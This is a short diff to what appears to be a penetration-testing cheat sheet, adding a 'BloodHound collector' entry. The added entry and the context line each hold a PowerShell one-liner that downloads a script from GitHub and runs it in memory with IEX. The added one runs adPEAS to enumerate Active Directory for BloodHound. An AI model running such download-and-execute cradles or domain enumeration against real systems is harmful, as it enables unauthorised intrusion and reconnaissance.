@@ -60,3 +60,8 @@ IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com
 Net.SecurityProtocolType]::Ssl2 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.Se
 curityProtocolType]::Tls12
 ~~~
+##### BloodHound collector (ADpeas)
+~~~
+IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/6110
+6960/adPEAS/main/adPEAS.ps1'); Invoke-adPEAS -Module Bloodhound -Scope All
+~~~
